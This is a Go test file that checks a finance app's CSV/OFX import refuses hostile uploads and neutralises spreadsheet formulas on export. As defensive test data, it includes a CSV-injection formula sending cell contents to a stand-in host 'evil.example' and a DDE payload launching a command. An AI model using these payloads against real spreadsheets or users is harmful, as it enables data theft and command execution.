package tests

import (
	"net/http"
	"strings"
	"testing"

	"github.com/AlexGalhardo/vukem/vukemtest"

	"github.com/AlexGalhardo/vukem-finances/app/finance"
	"github.com/AlexGalhardo/vukem-finances/app/models"
)

// An import file is untrusted: size, rows, fields, type and content are all checked, and a refused file
// leaves no import and no transaction behind.
func TestSecurity_ImportRefusesHostileUploads(t *testing.T) {
	t.Parallel()

	app, ana, acc := proWorkspace(t)

	csv := []byte("Date,Description,Amount\n2026-03-01,Coffee,-3.50\n")

	var tooMany strings.Builder

	tooMany.WriteString("Date,Description,Amount\n")

	for range 20001 {
		tooMany.WriteString("2026-03-01,x,-1.00\n")
	}

	var tooWide strings.Builder

	tooWide.WriteString(strings.Repeat("c,", 300) + "c\n" + strings.Repeat("1,", 300) + "1\n")

	cases := map[string]struct {
		filename, contentType string
		content               []byte
	}{
		"an executable":              {"statement.exe", "application/octet-stream", csv},
		"no extension":               {"statement", "text/csv", csv},
		"a pdf type on a csv":        {"statement.csv", "application/pdf", csv},
		"a html type on a csv":       {"statement.csv", "text/html", csv},
		"a csv type on an ofx":       {"statement.ofx", "text/csv", fixtureBytes(t, "sgml.ofx")},
		"ofx content in a csv":       {"statement.csv", "text/csv", fixtureBytes(t, "sgml.ofx")},
		"csv content in an ofx":      {"statement.ofx", "application/x-ofx", csv},
		"a NUL byte":                 {"statement.csv", "text/csv", []byte("Date,Description,Amount\n2026-03-01,Cof\x00fee,-3.50\n")},
		"an external entity":         {"statement.ofx", "application/x-ofx", fixtureBytes(t, "hostile-external-entity.ofx")},
		"billion laughs":             {"statement.ofx", "application/x-ofx", fixtureBytes(t, "hostile-billion-laughs.ofx")},
		"an ofx with no transaction": {"statement.ofx", "application/x-ofx", []byte("OFXHEADER:100\n<OFX></OFX>")},
		"a 20001st row":              {"statement.csv", "text/csv", []byte(tooMany.String())},
		"too many columns":           {"statement.csv", "text/csv", []byte(tooWide.String())},
		"over 2 MiB":                 {"statement.csv", "text/csv", []byte("Date,Description,Amount\n" + strings.Repeat("2026-03-01,x,-1.00\n", finance.MaxImportBytes/19+1))},
	}

	for name, c := range cases {
		res := uploadFile(t, ana, acc, c.filename, c.contentType, c.content)
		if res.Status() != http.StatusSeeOther {
			t.Errorf("%s: status %d, want the 303 back to the form", name, res.Status())
		}
	}

	vukemtest.AssertDatabaseCount(t, app, "imports", 0)
	vukemtest.AssertDatabaseCount(t, app, "transactions", 0)

	// The honest versions are accepted, with the generic types browsers send too (another workspace: the
	// upload limit is per workspace).
	bob := signUp(t, app, "Bob", "bob@example.com")
	makePro(t, app, bob)

	acc = firstAccount(t, app, bob)
	ana = bob

	for filename, contentType := range map[string]string{
		"a.csv": "text/csv", "b.csv": "application/vnd.ms-excel", "c.csv": "application/octet-stream", "d.csv": "text/csv; charset=utf-8",
	} {
		uploadFile(t, ana, acc, filename, contentType, csv).AssertOK()
	}

	uploadFile(t, ana, acc, "e.qfx", "application/vnd.intu.qfx", fixtureBytes(t, "sgml.ofx")).AssertOK()
}

func TestSecurity_ImportBoundsCellsAndKeepsFormulasAsTypedText(t *testing.T) {
	t.Parallel()

	app, ana, acc := proWorkspace(t)

	long := strings.Repeat("x", 1500)
	formula := `=HYPERLINK("http://evil.example/?"&A1,"click")`

	csv := []byte("Date,Description,Amount\n" +
		"2026-03-01,\"" + strings.ReplaceAll(formula, `"`, `""`) + "\",-3.50\n" +
		"2026-03-02," + long + ",-1.00\n" +
		"2026-03-03,+cmd|' /C calc'!A0,-2.00\n" +
		"2026-03-04,@SUM(1+1),-4.00\n")

	got := runImport(t, app, ana, acc, "formulas.csv", csv, csvMapping)
	if got.Imported != 3 || got.Failed != 1 || got.Status != models.ImportDone {
		t.Fatalf("import = %+v, want 3 imported and the 1500-character cell reported", got)
	}

	// Stored as typed: the risk is on export, where SpreadsheetSafe defuses it, and on screen, where React escapes text.
	vukemtest.AssertDatabaseHas(t, app, "transactions", map[string]any{"description": formula, "amount_cents": 350})
	vukemtest.AssertDatabaseHas(t, app, "transactions", map[string]any{"description": "@SUM(1+1)"})

	for _, d := range []string{formula, "+cmd|' /C calc'!A0", "@SUM(1+1)"} {
		if safe := finance.SpreadsheetSafe(d); safe[0] != '\'' || safe[1:] != d {
			t.Errorf("SpreadsheetSafe(%q) = %q, want a leading apostrophe", d, safe)
		}
	}

	// A long description that fits the cell limit is cut to 200 characters.
	mid := strings.Repeat("y", 900)
	if got := runImport(t, app, ana, acc, "mid.csv", []byte("Date,Description,Amount\n2026-03-05,"+mid+",-1.00\n"), csvMapping); got.Imported != 1 {
		t.Fatalf("import = %+v", got)
	}

	vukemtest.AssertDatabaseHas(t, app, "transactions", map[string]any{"description": strings.Repeat("y", 200)})
}
